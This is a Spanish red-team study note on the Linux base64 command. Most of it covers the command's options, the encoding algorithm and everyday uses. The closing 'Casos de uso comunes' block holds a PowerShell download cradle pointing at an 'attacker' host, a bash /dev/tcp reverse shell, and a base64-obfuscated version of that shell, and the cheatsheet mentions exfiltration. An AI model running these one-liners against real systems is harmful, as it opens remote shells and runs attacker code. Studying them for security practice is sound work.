---
aliases:
tags:
  - env/linux
  - tool/base64
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Operational Tasks]]"
tertiary categories:
  - "[[Procedures & Methodologies]]"
kind: Tool
linked:
---
# Comando `base64`

## Definición 

> [!INFO] base64
> Se utiliza para codificar y decodificar datos en el formato de codificación Base64. Esta codificación se utiliza comúnmente para convertir datos binarios en texto ASCII, permitiendo que los datos sean fácilmente transferidos a través de canales que sólo manejan texto, como el correo electrónico o ciertos protocolos de red.
^definicion

## Sintaxis

```sh
base64 [opciones] [archivo]
```

## Principales opciones

- `-d`, `--decode`: Decodifica los datos en Base64.
- `-i`, `--ignore-garbage`: Ignora los caracteres no válidos al decodificar.
- `-w`, `--wrap=N`: Inserta un salto de línea cada N caracteres en la salida de codificación. El valor predeterminado es 76. Usa `0` para no insertar saltos de línea.
- `--version`: Muestra la versión del programa y sale.

## Ejemplos

1. **Codificar un archivo en Base64:**
   ```sh
   base64 archivo.txt
   ```
   Esto codifica el contenido de `archivo.txt` y lo muestra en la salida estándar.

2. **Decodificar un archivo codificado en Base64:**
   ```sh
   base64 -d archivo_base64.txt
   ```
   Esto decodifica el contenido de `archivo_base64.txt` y lo muestra en la salida estándar.

3. **Codificar un archivo y guardar la salida en otro archivo:**
   ```sh
   base64 archivo.txt > archivo_base64.txt
   ```
   Esto codifica `archivo.txt` y guarda la salida en `archivo_base64.txt`.

4. **Decodificar un archivo y guardar la salida en otro archivo:**
   ```sh
   base64 -d archivo_base64.txt > archivo_decodificado.txt
   ```
   Esto decodifica `archivo_base64.txt` y guarda la salida en `archivo_decodificado.txt`.

5. **Codificar una cadena de texto:**
   ```sh
   echo "texto a codificar" | base64
   ```
   Esto codifica la cadena "texto a codificar" y muestra el resultado en la salida estándar.

6. **Decodificar una cadena de texto:**
   ```sh
   echo "dGV4dG8gYSBkZWNvZGlmaWNhcg==" | base64 -d
   ```
   Esto decodifica la cadena "dGV4dG8gYSBkZWNvZGlmaWNhcg==" y muestra el resultado en la salida estándar.

## Funcionamiento de la Codificación Base64

1. **División en bloques**: Los datos de entrada se dividen en bloques de 3 bytes (24 bits).

2. **Conversión a Base64**: Cada bloque de 3 bytes se convierte en cuatro números de 6 bits. Esto se logra dividiendo los 24 bits en 4 grupos de 6 bits cada uno.

3. **Mapeo a caracteres**: Cada número de 6 bits se mapea a un carácter de un conjunto de 64 caracteres. El conjunto de caracteres Base64 incluye letras mayúsculas (A-Z), letras minúsculas (a-z), dígitos (0-9), y dos caracteres adicionales (`+` y `/`).

4. **Padding (relleno)**: Si el número de bytes de entrada no es múltiplo de 3, se agrega un padding con caracteres **=** para completar el último bloque a 4 caracteres. Un byte de padding se agrega si hay 2 bytes restantes, y dos bytes de padding se agregan si hay 1 byte restante.

## Ejemplos

### Ejemplo 1

Tomemos la cadena "Man" como ejemplo:

1. **Representación binaria**:
   - `M`: 01001101
   - `a`: 01100001
   - `n`: 01101110

2. **Concatenación**: Concatenamos los bits: `01001101 01100001 01101110`

3. **División en bloques de 6 bits**:
   - 010011
   - 010110
   - 000101
   - 101110

4. **Conversión a decimal**:
   - 010011: 19
   - 010110: 22
   - 000101: 5
   - 101110: 46

5. **Mapeo a caracteres Base64**:
   - 19: T
   - 22: W
   - 5: F
   - 46: u

Entonces, la cadena "Man" en Base64 es "TWFu".

Cuando codificas un texto en Base64, estás transformando los datos binarios del texto en una representación de texto ASCII. Aquí tienes una explicación más detallada del proceso:

### Ejemplo 2

Tomemos el texto "Hola" como ejemplo:

1. **Texto Original**:
   - `H`: 72 en ASCII -> `01001000` en binario
   - `o`: 111 en ASCII -> `01101111` en binario
   - `l`: 108 en ASCII -> `01101100` en binario
   - `a`: 97 en ASCII -> `01100001` en binario

2. **Concatenación de Bits**:
   ```
   01001000 01101111 01101100 01100001
   ```

3. **División en Bloques de 6 Bits**:
   ```
   010010 000110 111101 101100 011000 01 (agregar dos ceros al final para completar el último bloque)
   ```

4. **Conversión a Números**:
   - 010010 -> 18
   - 000110 -> 6
   - 111101 -> 61
   - 101100 -> 44
   - 011000 -> 24
   - 010000 -> 16 (debido a los ceros agregados)

5. **Mapeo a Caracteres Base64**:
   - 18 -> S
   - 6 -> G
   - 61 -> 9
   - 44 -> s
   - 24 -> Y
   - 16 -> Q

6. **Resultado Final**:
   ```
   SG9sYQ==
   ```

Entonces, el texto "Hola" codificado en Base64 se convierte en "SG9sYQ==".

## Usos Comunes de Base64

Base64 se usa cuando hay que convertir datos binarios en texto legible, generalmente en entornos donde solo se permiten caracteres imprimibles. Aquí te explico los usos más comunes:

### Codificación de imágenes y archivos en texto

Se usa en HTML, JSON o XML para incrustar imágenes y otros archivos binarios sin necesidad de enlaces externos.

🔹 **Ejemplo en HTML (imagen codificada en Base64):**
```html
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." />
```

✅ Esto permite incrustar la imagen sin necesidad de un archivo separado.

### Autenticación en HTTP (Basic Authentication)

En protocolos web, Base64 se usa para enviar credenciales en **autenticación básica HTTP**.

🔹 **Ejemplo:**  
Usuario: `admin`  
Contraseña: `1234`

Se concatena `admin:1234` y se codifica en Base64:
```
YWRtaW46MTIzNA==
```

Luego, en una petición HTTP:
```
Authorization: Basic YWRtaW46MTIzNA==
```

✅ Esto no es seguro por sí solo, porque Base64 **no cifra**, solo codifica. Se usa junto con HTTPS.

### Almacenamiento de datos binarios en JSON o XML

Si necesitas guardar imágenes, archivos o datos binarios en una base de datos que solo admite texto, puedes codificarlos en Base64.

🔹 **Ejemplo en JSON:**
```json
{
  "nombre": "foto.png",
  "contenido": "iVBORw0KGgoAAAANSUhEUgAA..."
}
```

✅ Útil para APIs o bases de datos que no manejan binarios directamente.

### Envío de archivos adjuntos en correos electrónicos (MIME Encoding

Los correos electrónicos usan **MIME (Multipurpose Internet Mail Extensions)**, y Base64 permite enviar archivos adjuntos dentro del correo sin corromper los datos.

🔹 **Ejemplo de un correo con Base64:**
```
Content-Type: image/png
Content-Transfer-Encoding: base64

iVBORw0KGgoAAAANSUhEUgAA...
```

✅ Esto hace que el archivo pueda ser leído correctamente por los clientes de correo.

### Codificación en URLs (variante Base64URL)

Algunos sistemas usan una variante llamada **Base64URL**, que reemplaza `+` y `/` con `-` y `_` para ser más seguro en URLs.

🔹 **Ejemplo en JWT (JSON Web Tokens, usados en autenticación web):**  
Un token JWT contiene información codificada en Base64URL:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

✅ Así se transmiten datos en autenticación sin necesidad de sesiones en el servidor.

### Base64 en formato para que Windows lo reconozca

```bash
echo -n "reverse" | iconv -t UTF-16LE | base64 -w0
```
---

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `echo -n 'text' \| base64` | Encode | Payload encoding, Basic Auth |
| `echo 'dGV4dA==' \| base64 -d` | Decode | Análisis de tokens, JWT payload |
| `base64 file.bin > file.b64` | Encode archivo | Exfil via canal texto-only |
| `base64 -d file.b64 > file.bin` | Decode archivo | Reconstruir binario |
| `cat file \| base64 -w 0` | Encode sin wraps | Single-line para curl/payloads |

---

## Casos de uso comunes

```bash
# Basic Auth header
echo -n 'admin:password' | base64
# → YWRtaW46cGFzc3dvcmQ=
curl -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' http://target

# PowerShell encoded command
pwsh_payload='IEX (New-Object Net.WebClient).DownloadString("http://attacker/p.ps1")'
echo -n "$pwsh_payload" | iconv -t UTF-16LE | base64 -w 0
# → AABJAEUAWAAg...
# Ejecutar: powershell -EncodedCommand <output>

# Reverse shell en una línea (encoded)
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
# Encode: echo -n 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64
# → YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

---

## Variantes

- **base32**: `echo 'X' | base32` / `base32 -d`
- **URL-safe Base64**: usa `-` y `_` en lugar de `+` y `/`. Python: `base64.urlsafe_b64encode()`.

---

## Notas Relacionadas

- [[JWT Attacks]]
- [[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)]]
